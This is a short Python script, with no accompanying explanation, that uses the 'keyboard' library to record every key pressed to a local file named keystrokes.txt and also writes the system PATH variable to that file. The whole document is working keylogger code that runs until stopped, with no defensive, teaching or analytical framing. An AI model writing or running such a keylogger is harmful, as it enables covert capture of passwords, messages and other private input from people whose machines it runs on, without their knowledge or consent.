import keyboard
import os
log_file = 'keystrokes.txt'
def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))
path_variable = os.environ.get('PATH')
with open(log_file, 'a') as f:
    f.write('PATH Variable: {}\n'.format(path_variable))
keyboard.on_press(on_key_press)
keyboard.wait()